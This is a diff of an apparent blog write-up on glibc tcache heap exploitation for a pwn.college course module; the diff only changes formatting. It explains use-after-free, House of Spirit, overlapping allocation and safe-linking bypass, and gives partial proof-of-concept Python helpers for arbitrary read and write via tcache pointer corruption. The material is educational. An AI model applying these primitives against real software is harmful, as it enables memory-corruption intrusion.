@@ -1,6 +1,6 @@
 ---
-title: "Dynamic Allocator Misuse(Tcache) - pwn.college"
-date: "2023-04-11"
+title: 'Dynamic Allocator Misuse(Tcache) - pwn.college'
+date: '2023-04-11'
 tags: ['pwn.college', 'Pwn']
 draft: false
 summary: "Here is my write-up for the dynamic-allocator-misuse(heap) module of the `pwn.college`. Due to the disclosure agreement, I won't post the full exploit but the PoC code to show the idea of the solutions. Glad to see they are adding more challenging levels at the end. Have fun."
@@ -8,13 +8,11 @@ summary: "Here is my write-up for the dynamic-allocator-misuse(heap) module of t
 
 Here is my write-up for the dynamic-allocator-misuse(heap) module of the `pwn.college`. Due to the disclosure agreement, I won't post the full exploit but the PoC code to show the idea of the solutions. Glad to see they are adding more challenging levels at the end. Have fun.
 
-
-
 ### Tcache pwn techniques
 
 #### UAF
 
-Use-After-Free vulnerability is the most commonly seen component in our exploit which allows us the read/write a freed chunk so that we could manipulate the heap bins(lists). 
+Use-After-Free vulnerability is the most commonly seen component in our exploit which allows us the read/write a freed chunk so that we could manipulate the heap bins(lists).
 
 #### Heap overflow
 
@@ -33,11 +31,11 @@ def get_arbitrary_addr_pointer(index, addr):
     malloc(index+1, 16)
     free(index)
     free(index+1)
-	
+
 	// corrupt the next_ptr field through UAF
     payload = p64(addr)
     scanf(payload, index+1)
-    
+
     // allocation
     malloc(index+2, 16)
     malloc(index+3, 16)
@@ -53,7 +51,7 @@ However, new versions of glibc/ptmalloc introduced the key field check, but we c
 
 #### House of Spirit(Tcache)
 
-This exploit technique takes advantage of the fact that there are very few checks done at free() time. Therefore, we could: 
+This exploit technique takes advantage of the fact that there are very few checks done at free() time. Therefore, we could:
 
 ```
 """
@@ -81,7 +79,7 @@ def memory_copy(from_addr, start_index):
     free(start_index+1)
 
     scanf(p64(from_addr), start_index+1)
-    malloc(start_index+2, 16) 
+    malloc(start_index+2, 16)
     ### after this malloc, the tcache bin looks like
     # b'+====================+========================+==============+============================+============================+\n'
     # b'| TCACHE BIN #0      | SIZE: 0 - 24           | COUNT: 1     | HEAD: 0x43a240             | KEY: 0x2335010             |\n'
@@ -90,7 +88,7 @@ def memory_copy(from_addr, start_index):
     # b'+---------------------+---------------------+------------------------------+---------------------+---------------------+\n'
     # b'| 0x43a240            | 0                   | 0 (NONE)                     | 0x7975637076647767  | 0x61706a6161657670  |\n'
     # b'+----------------------------------------------------------------------------------------------------------------------+\n'
-    
+
     malloc(start_index+3, 16) ### the tcache head = last malloced chunks's next_ptr field which is our secret value
     # b'+====================+========================+==============+============================+============================+\n'
     # b'| TCACHE BIN #0      | SIZE: 0 - 24           | COUNT: 1     | HEAD: 0x7975637076647767 | KEY: 0x61706a6161657670      |\n'
@@ -108,12 +106,10 @@ def memory_copy(from_addr, start_index):
     # b'| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |\n'
     # b'+---------------------+---------------------+------------------------------+---------------------+---------------------+\n'
     # b'| 0x2335300           | 0                   | 0x21 (P)                     | 0x7975637076645068  | 0xbb650148292049e7  |\n'
-    # b'+----------------------------------------------------------------------------------------------------------------------+\n' 
+    # b'+----------------------------------------------------------------------------------------------------------------------+\n'
 
     return start_index+4
 ```
-
-
 
 #### Overlapping allocation
 
@@ -133,9 +129,7 @@ Without use-after-free, we cannot directly touch that field, but we could levera
 9/ Allocate another memory chunk (chunk_6) of size 0x10 using malloc(). This new chunk will be allocated at the arbitrary address specified earlier.
 ```
 
-Levels 19 and 20 show this trick well. 
-
-
+Levels 19 and 20 show this trick well.
 
 ### Tcache mitigation and bypass
 
@@ -151,7 +145,7 @@ https://docs.google.com/presentation/d/1TfwQjqDUFwnhp4pm0W5gFZsTIJO92xtemrp66z-a
 #define REVEAL_PTR(ptr)
   ((size_t) &ptr) >> 12) ^ ((size_t) ptr)))
 
-// during the free 
+// during the free
 tcache_put (mchunkptr chunk, size_t tc_idx)
 {
 	//...
@@ -200,4 +194,3 @@ Addresses eligible for the malloc operation must be aligned to 0x10. Try to mall
 Due to the policy of the pwn.college, the writeups will be hidden.
 
 > The challenges created for pwn.college are educational material, and are used to grade students at ASU. Because of this, we would appreciate that writeups, walkthrough videos, and livestreams of challenge solutions are not posted to the internet. Obviously, we can’t enforce this, but we worked hard to make all of this public, and we would appreciate your help in keeping pwn.college a viable educational platform.
-
